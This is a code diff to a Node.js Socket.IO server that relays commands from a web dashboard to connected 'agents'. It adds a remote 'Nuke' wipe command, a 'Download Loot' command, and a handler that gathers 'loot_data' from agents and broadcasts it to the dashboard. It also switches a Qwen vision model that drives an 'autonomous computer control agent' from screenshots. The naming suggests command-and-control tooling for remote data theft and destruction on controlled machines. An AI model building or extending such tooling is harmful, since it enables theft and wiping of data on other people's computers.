@@ -226,12 +226,24 @@ io.on('connection', (socket) => {
     }
   });
 
-  // 6. Web Dashboard triggers Wipe
-  socket.on('trigger_wipe', () => {
-    console.log(`[WIPE] Wipe command triggered by Dashboard for active agent!`);
+  // 5. Nuke command
+  socket.on('wipe_agent', () => {
     if (activeAgentSocketId && agents[activeAgentSocketId]) {
       io.to(activeAgentSocketId).emit('trigger_wipe');
     }
+  });
+
+  // 6. Download Loot command
+  socket.on('download_loot', () => {
+    if (activeAgentSocketId && agents[activeAgentSocketId]) {
+      io.to(activeAgentSocketId).emit('download_loot');
+    }
+  });
+
+  // 7. Receive Loot from Agent
+  socket.on('loot_data', (data) => {
+    // Broadcast back to all web clients
+    io.emit('loot_data', data);
   });
 
   // Handle Disconnection
@@ -306,7 +318,7 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
     if (primaryProvider === 'qwen') {
       const qwen = new OpenAI({ apiKey: aiConfig.qwenKey, baseURL: 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1' });
       const response = await qwen.chat.completions.create({
-        model: "qwen-vl-plus",
+        model: "qwen-vl-max",
         messages: [
           { role: "system", content: "You are an autonomous computer control agent. Respond only with valid JSON." },
           { role: "user", content: [
@@ -349,7 +361,7 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
               
               const qwen = new OpenAI({ apiKey: aiConfig.qwenKey, baseURL: 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1' });
               const visionResponse = await qwen.chat.completions.create({
-                model: "qwen-vl-plus",
+                model: "qwen-vl-max",
                 messages: [
                   { role: "system", content: "You are a screen parser. Analyze the image and describe the layout. Do not generate JSON commands." },
                   { role: "user", content: [
